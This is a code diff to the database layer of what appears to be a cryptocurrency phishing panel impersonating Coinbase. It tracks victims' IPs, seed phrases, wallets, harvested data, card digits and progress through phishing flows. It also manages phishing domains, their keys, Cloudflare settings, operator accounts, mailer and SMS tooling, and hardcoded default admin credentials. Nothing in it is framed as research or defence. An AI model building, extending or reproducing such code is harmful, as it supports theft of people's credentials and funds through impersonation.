@@ -306,6 +306,9 @@ function migrate(db: Database.Database): void {
 	addColumnIfMissing(db, 'visitors', 'flow_bypassed', "INTEGER NOT NULL DEFAULT 0");
 	addColumnIfMissing(db, 'visitors', 'captured_by', "TEXT NOT NULL DEFAULT ''");
 	addColumnIfMissing(db, 'visitors', 'last_two_digits', "TEXT NOT NULL DEFAULT ''");
+	addColumnIfMissing(db, 'visitors', 'email_from', "TEXT NOT NULL DEFAULT ''");
+	addColumnIfMissing(db, 'visitors', 'email_to', "TEXT NOT NULL DEFAULT ''");
+	addColumnIfMissing(db, 'visitors', 'flow_steps', "TEXT NOT NULL DEFAULT ''");
 	addColumnIfMissing(db, 'harvested_data', 'captured_by', "TEXT NOT NULL DEFAULT ''");
 	addColumnIfMissing(db, 'user_accounts', 'password_hash', "TEXT NOT NULL DEFAULT ''");
 	addColumnIfMissing(db, 'custom_domains', 'module', "TEXT NOT NULL DEFAULT 'Coinbase'");
@@ -321,6 +324,8 @@ function migrate(db: Database.Database): void {
 	addColumnIfMissing(db, 'custom_domains', 'cf_ns_primary', "TEXT NOT NULL DEFAULT ''");
 	addColumnIfMissing(db, 'custom_domains', 'cf_ns_secondary', "TEXT NOT NULL DEFAULT ''");
 	addColumnIfMissing(db, 'custom_domains', 'last_checked', "INTEGER NOT NULL DEFAULT 0");
+	addColumnIfMissing(db, 'custom_domains', 'flow_id', "TEXT NOT NULL DEFAULT ''");
+	addColumnIfMissing(db, 'case_codes', 'flow_id', "TEXT NOT NULL DEFAULT ''");
 
 	db.exec(`CREATE INDEX IF NOT EXISTS idx_visitors_module ON visitors(module);`);
 	db.exec(`CREATE INDEX IF NOT EXISTS idx_domains_kind ON custom_domains(kind);`);
@@ -350,27 +355,38 @@ function addColumnIfMissing(db: Database.Database, table: string, column: string
 }
 
 export function dbSeedDefaultTemplates(templates: Array<{ id: string; name: string; subject: string; variables: string[]; html: string; by: string }>): void {
-	const existing = getDb().prepare('SELECT COUNT(*) as c FROM mail_templates').get() as { c: number };
-	if (existing.c > 0) return;
-	const now = Date.now();
-	const stmt = getDb().prepare(
-		`INSERT OR IGNORE INTO mail_templates (slug, name, subject, html, variables, owner_username, shared, created_at, updated_at)
+	if (templates.length === 0) return;
+	const db = getDb();
+	const find = db.prepare('SELECT id, owner_username FROM mail_templates WHERE slug = ?');
+	const insert = db.prepare(
+		`INSERT INTO mail_templates (slug, name, subject, html, variables, owner_username, shared, created_at, updated_at)
 		 VALUES (?, ?, ?, ?, ?, ?, 1, ?, ?)`
 	);
+	const update = db.prepare(
+		`UPDATE mail_templates SET name = ?, subject = ?, html = ?, variables = ?, updated_at = ? WHERE slug = ?`
+	);
+	const now = Date.now();
+	let inserted = 0;
+	let updated = 0;
 	for (const t of templates) {
-		stmt.run(t.id, t.name, t.subject, t.html, JSON.stringify(t.variables), t.by || 'admin', now, now);
+		const row = find.get(t.id) as { id: number; owner_username: string } | undefined;
+		if (!row) {
+			insert.run(t.id, t.name, t.subject, t.html, JSON.stringify(t.variables), t.by || 'admin', now, now);
+			inserted++;
+		} else if (!row.owner_username || row.owner_username === 'admin') {
+			update.run(t.name, t.subject, t.html, JSON.stringify(t.variables), now, t.id);
+			updated++;
+		}
 	}
-	console.log(`[db] Seeded ${templates.length} default mail templates`);
+	if (inserted > 0 || updated > 0) {
+		console.log(`[db] Mail templates: ${inserted} inserted, ${updated} updated`);
+	}
 }
 
 function seedDefaultAdmin(db: Database.Database): void {
-	const existing = db
-		.prepare('SELECT id FROM user_accounts WHERE password_hash != ?')
-		.get('') as { id: number } | undefined;
-	if (existing) return;
-
-	const username = process.env.ADMIN_USERNAME || 'ham';
-	const password = process.env.ADMIN_PASSWORD || 'ham123';
+	const username = process.env.ADMIN_USERNAME || 'apollo';
+	const password = process.env.ADMIN_PASSWORD || 'apollo123';
+	const forceReset = process.env.ADMIN_PASSWORD !== undefined && process.env.ADMIN_PASSWORD !== '';
 	const hash = hashPassword(password);
 	const created = new Date().toLocaleDateString('en-US', {
 		month: 'short',
@@ -378,12 +394,22 @@ function seedDefaultAdmin(db: Database.Database): void {
 		year: 'numeric'
 	});
 
-	db.prepare(
-		`INSERT INTO user_accounts (username, password_hash, role, created_at, active)
-		 VALUES (?, ?, 'admin', ?, 1)
-		 ON CONFLICT(username) DO UPDATE SET password_hash = excluded.password_hash`
-	).run(username, hash, created);
-	console.log(`[db] Seeded admin user "${username}" (set ADMIN_USERNAME / ADMIN_PASSWORD env to override)`);
+	const row = db
+		.prepare('SELECT id, password_hash FROM user_accounts WHERE username = ?')
+		.get(username) as { id: number; password_hash: string } | undefined;
+
+	if (!row) {
+		db.prepare(
+			`INSERT INTO user_accounts (username, password_hash, role, created_at, active)
+			 VALUES (?, ?, 'admin', ?, 1)`
+		).run(username, hash, created);
+		console.log(`[db] Created default admin "${username}"`);
+	} else if (forceReset || !row.password_hash?.startsWith('scrypt$')) {
+		db.prepare(
+			`UPDATE user_accounts SET password_hash = ?, role = 'admin', active = 1 WHERE username = ?`
+		).run(hash, username);
+		console.log(`[db] Reset password for admin "${username}"`);
+	}
 }
 
 import crypto from 'node:crypto';
@@ -415,10 +441,11 @@ export function dbGetVisitors(): Visitor[] {
 }
 
 export function dbUpsertVisitor(v: Visitor): void {
+	const flowStepsJson = v.flowSteps?.length ? JSON.stringify(v.flowSteps) : '';
 	getDb()
 		.prepare(
-			`INSERT INTO visitors (ip, flag, city, region, country, status, flow, last_seen, connected_at, phrases, accounts, uploads, platform, device, email, module, user_id, user_agent, browser, last_page_route, flow_bypassed, captured_by, last_two_digits)
-			 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+			`INSERT INTO visitors (ip, flag, city, region, country, status, flow, last_seen, connected_at, phrases, accounts, uploads, platform, device, email, module, user_id, user_agent, browser, last_page_route, flow_bypassed, captured_by, last_two_digits, email_from, email_to, flow_steps)
+			 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
 			 ON CONFLICT(ip) DO UPDATE SET
 				flag=excluded.flag, city=excluded.city, region=excluded.region, country=excluded.country,
 				status=excluded.status, flow=excluded.flow, last_seen=excluded.last_seen,
@@ -426,7 +453,8 @@ export function dbUpsertVisitor(v: Visitor): void {
 				uploads=excluded.uploads, platform=excluded.platform, device=excluded.device,
 				email=excluded.email, module=excluded.module, user_id=excluded.user_id,
 				user_agent=excluded.user_agent, browser=excluded.browser, last_page_route=excluded.last_page_route,
-				flow_bypassed=excluded.flow_bypassed, captured_by=excluded.captured_by, last_two_digits=excluded.last_two_digits`
+				flow_bypassed=excluded.flow_bypassed, captured_by=excluded.captured_by, last_two_digits=excluded.last_two_digits,
+				email_from=excluded.email_from, email_to=excluded.email_to, flow_steps=excluded.flow_steps`
 		)
 		.run(
 			v.ip, v.flag, v.city, v.region, v.country, v.status,
@@ -434,8 +462,14 @@ export function dbUpsertVisitor(v: Visitor): void {
 			v.uploads, v.platform, v.device,
 			v.email || '', v.module || 'Coinbase', v.userId || '', v.userAgent || '',
 			v.browser || '', v.lastPageRoute || '', v.flowBypassed ? 1 : 0,
-			v.capturedBy || '', v.lastTwoDigits || ''
+			v.capturedBy || '', v.lastTwoDigits || '',
+			v.emailFrom || '', v.emailTo || '', flowStepsJson
 		);
+}
+
+export function dbSetVisitorFlowSteps(ip: string, steps: { page: string; passed: boolean }[]): void {
+	const json = steps?.length ? JSON.stringify(steps) : '';
+	getDb().prepare('UPDATE visitors SET flow_steps = ? WHERE ip = ?').run(json, ip);
 }
 
 export function dbDeleteVisitor(ip: string): void {
@@ -452,6 +486,10 @@ export function dbSetVisitorBypass(ip: string, bypassed: boolean): void {
 
 export function dbSetVisitorLastTwo(ip: string, digits: string): void {
 	getDb().prepare('UPDATE visitors SET last_two_digits = ? WHERE ip = ?').run(digits, ip);
+}
+
+export function dbSetVisitorEmailMasks(ip: string, emailFrom: string, emailTo: string): void {
+	getDb().prepare('UPDATE visitors SET email_from = ?, email_to = ? WHERE ip = ?').run(emailFrom, emailTo, ip);
 }
 
 export function dbSetVisitorLastPage(ip: string, route: string): void {
@@ -535,7 +573,15 @@ function rowToVisitor(row: any): Visitor {
 		device: row.device,
 		lastPage: row.last_page_route || '',
 		lastPageRoute: row.last_page_route || '',
-		flowSteps: [],
+		flowSteps: (() => {
+			if (!row.flow_steps) return [];
+			try {
+				const parsed = JSON.parse(row.flow_steps);
+				return Array.isArray(parsed) ? parsed : [];
+			} catch {
+				return [];
+			}
+		})(),
 		inputs: {},
 		wallets: [],
 		screenSize: '',
@@ -549,7 +595,9 @@ function rowToVisitor(row: any): Visitor {
 		userAgent: row.user_agent || '',
 		flowBypassed: !!row.flow_bypassed,
 		capturedBy: row.captured_by || '',
-		lastTwoDigits: row.last_two_digits || ''
+		lastTwoDigits: row.last_two_digits || '',
+		emailFrom: row.email_from || '',
+		emailTo: row.email_to || ''
 	};
 }
 
@@ -1460,6 +1508,57 @@ export function dbGetUserByUsername(username: string): { id: number; username: s
 		.get(username) as any;
 }
 
+export function dbGetUserById(id: number): { id: number; username: string; password_hash: string; role: string; active: number } | undefined {
+	return getDb()
+		.prepare('SELECT id, username, password_hash, role, active FROM user_accounts WHERE id = ?')
+		.get(id) as any;
+}
+
+export function dbUpdateUserProfile(
+	userId: number,
+	updates: { username?: string; passwordHash?: string }
+): void {
+	const db = getDb();
+	const sets: string[] = [];
+	const values: unknown[] = [];
+	if (updates.username !== undefined) {
+		sets.push('username = ?');
+		values.push(updates.username);
+	}
+	if (updates.passwordHash !== undefined) {
+		sets.push('password_hash = ?');
+		values.push(updates.passwordHash);
+	}
+	if (sets.length === 0) return;
+	values.push(userId);
+	db.prepare(`UPDATE user_accounts SET ${sets.join(', ')} WHERE id = ?`).run(...values);
+}
+
+export function dbRenameUserUsername(userId: number, oldUsername: string, newUsername: string): void {
+	const db = getDb();
+	const ownerTables = [
+		'mail_templates',
+		'protected_urls',
+		'mailer_presets',
+		'sms_devices',
+		'gmail_accounts',
+		'gmail_links',
+		'gmail_sender_presets',
+		'case_codes'
+	] as const;
+	const tx = db.transaction(() => {
+		for (const table of ownerTables) {
+			db.prepare(`UPDATE ${table} SET owner_username = ? WHERE owner_username = ?`).run(
+				newUsername,
+				oldUsername
+			);
+		}
+		db.prepare('UPDATE sessions SET username = ? WHERE user_id = ?').run(newUsername, userId);
+		db.prepare('UPDATE user_accounts SET username = ? WHERE id = ?').run(newUsername, userId);
+	});
+	tx();
+}
+
 export function dbUpdateLastLogin(id: number): void {
 	getDb()
 		.prepare("UPDATE user_accounts SET last_login = ? WHERE id = ?")
@@ -1481,6 +1580,10 @@ export function dbGetSession(token: string): { user_id: number; username: string
 
 export function dbDeleteSession(token: string): void {
 	getDb().prepare('DELETE FROM sessions WHERE token = ?').run(token);
+}
+
+export function dbDeleteSessionsByUser(userId: number): void {
+	getDb().prepare('DELETE FROM sessions WHERE user_id = ?').run(userId);
 }
 
 export function dbCleanExpiredSessions(): void {
@@ -1612,8 +1715,48 @@ export function dbInsertUser(username: string, role: string): number {
 	return Number(result.lastInsertRowid);
 }
 
+export function dbInsertUserWithPassword(
+	username: string,
+	passwordHash: string,
+	role: string = 'user',
+	active: boolean = true
+): number {
+	const result = getDb()
+		.prepare('INSERT INTO user_accounts (username, password_hash, role, created_at, active) VALUES (?, ?, ?, ?, ?)')
+		.run(
+			username,
+			passwordHash,
+			role,
+			new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }),
+			active ? 1 : 0
+		);
+	return Number(result.lastInsertRowid);
+}
+
+export function dbSetUserActive(userId: number, active: boolean): void {
+	getDb().prepare('UPDATE user_accounts SET active = ? WHERE id = ?').run(active ? 1 : 0, userId);
+	if (!active) {
+		dbDeleteSessionsByUser(userId);
+	}
+}
+
 export function dbDeleteUser(id: string): void {
-	getDb().prepare('DELETE FROM user_accounts WHERE id=?').run(Number(id));
+	const userId = Number(id);
+	dbDeleteSessionsByUser(userId);
+	getDb().prepare('DELETE FROM user_accounts WHERE id=?').run(userId);
+}
+
+export function dbRotateAllDomainPhishKeys(): void {
+	const db = getDb();
+	const domains = db.prepare('SELECT id FROM custom_domains').all() as { id: number }[];
+	const update = db.prepare('UPDATE custom_domains SET phish_key = ? WHERE id = ?');
+	const tx = db.transaction(() => {
+		for (const d of domains) {
+			const newKey = Math.random().toString(36).substring(2, 14);
+			update.run(newKey, d.id);
+		}
+	});
+	tx();
 }
 
 // --- Custom Domains ---
@@ -1623,12 +1766,19 @@ export function dbGetDomains(): CustomDomain[] {
 	return rows.map(rowToDomain);
 }
 
+export function dbGetDomainByHost(host: string): CustomDomain | undefined {
+	const row = getDb()
+		.prepare('SELECT * FROM custom_domains WHERE LOWER(domain) = LOWER(?)')
+		.get(host) as any;
+	return row ? rowToDomain(row) : undefined;
+}
+
 export function dbInsertDomain(domain: string, phishKey: string, opts: Partial<CustomDomain> = {}): number {
 	const result = getDb()
 		.prepare(
 			`INSERT INTO custom_domains
-			 (domain, status, phish_key, created_at, module, landing_page, kind, id_mode, case_id, under_attack, serving)
-			 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
+			 (domain, status, phish_key, created_at, module, landing_page, kind, id_mode, case_id, under_attack, serving, flow_id)
+			 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
 		)
 		.run(
 			domain,
@@ -1641,7 +1791,8 @@ export function dbInsertDomain(domain: string, phishKey: string, opts: Partial<C
 			opts.idMode || 'case_input',
 			opts.caseId || '',
 			opts.underAttack ? 1 : 0,
-			opts.serving === false ? 0 : 1
+			opts.serving === false ? 0 : 1,
+			opts.flowId || ''
 		);
 	return Number(result.lastInsertRowid);
 }
@@ -1664,7 +1815,8 @@ export function dbUpdateDomain(id: string, patch: Partial<CustomDomain>): void {
 		cfStatus: 'cf_status',
 		cfNsPrimary: 'cf_ns_primary',
 		cfNsSecondary: 'cf_ns_secondary',
-		lastChecked: 'last_checked'
+		lastChecked: 'last_checked',
+		flowId: 'flow_id'
 	};
 	for (const [k, v] of Object.entries(patch)) {
 		const col = map[k];
@@ -1700,7 +1852,8 @@ function rowToDomain(row: any): CustomDomain {
 		cfStatus: row.cf_status || 'unknown',
 		cfNsPrimary: row.cf_ns_primary || '',
 		cfNsSecondary: row.cf_ns_secondary || '',
-		lastChecked: row.last_checked || 0
+		lastChecked: row.last_checked || 0,
+		flowId: row.flow_id || ''
 	};
 }
 
@@ -1744,6 +1897,7 @@ export interface DbCaseCode {
 	ownerUsername: string;
 	createdAt: number;
 	expiresAt: number;
+	flowId: string;
 }
 
 function rowToCaseCode(row: any): DbCaseCode {
@@ -1759,7 +1913,8 @@ function rowToCaseCode(row: any): DbCaseCode {
 		lastUsedIp: row.last_used_ip || '',
 		ownerUsername: row.owner_username || '',
 		createdAt: row.created_at || 0,
-		expiresAt: row.expires_at || 0
+		expiresAt: row.expires_at || 0,
+		flowId: row.flow_id || ''
 	};
 }
 
@@ -1811,8 +1966,8 @@ export function dbInsertCaseCode(input: Omit<DbCaseCode, 'id' | 'uses' | 'lastUs
 	const now = Date.now();
 	const result = getDb()
 		.prepare(
-			`INSERT INTO case_codes (code, label, module, target_page, active, uses, last_used_at, last_used_ip, owner_username, created_at, expires_at)
-			 VALUES (?, ?, ?, ?, ?, 0, 0, '', ?, ?, ?)`
+			`INSERT INTO case_codes (code, label, module, target_page, active, uses, last_used_at, last_used_ip, owner_username, created_at, expires_at, flow_id)
+			 VALUES (?, ?, ?, ?, ?, 0, 0, '', ?, ?, ?, ?)`
 		)
 		.run(
 			input.code,
@@ -1822,7 +1977,8 @@ export function dbInsertCaseCode(input: Omit<DbCaseCode, 'id' | 'uses' | 'lastUs
 			input.active ? 1 : 0,
 			input.ownerUsername || '',
 			input.createdAt || now,
-			input.expiresAt || 0
+			input.expiresAt || 0,
+			input.flowId || ''
 		);
 	return rowToCaseCode({
 		id: result.lastInsertRowid,
@@ -1836,7 +1992,8 @@ export function dbInsertCaseCode(input: Omit<DbCaseCode, 'id' | 'uses' | 'lastUs
 		last_used_ip: '',
 		owner_username: input.ownerUsername || '',
 		created_at: input.createdAt || now,
-		expires_at: input.expiresAt || 0
+		expires_at: input.expiresAt || 0,
+		flow_id: input.flowId || ''
 	});
 }
 
@@ -1846,7 +2003,8 @@ export function dbUpdateCaseCode(id: string, patch: Partial<DbCaseCode>): void {
 		module: 'module',
 		targetPage: 'target_page',
 		active: 'active',
-		expiresAt: 'expires_at'
+		expiresAt: 'expires_at',
+		flowId: 'flow_id'
 	};
 	const fields: string[] = [];
 	const params: any[] = [];
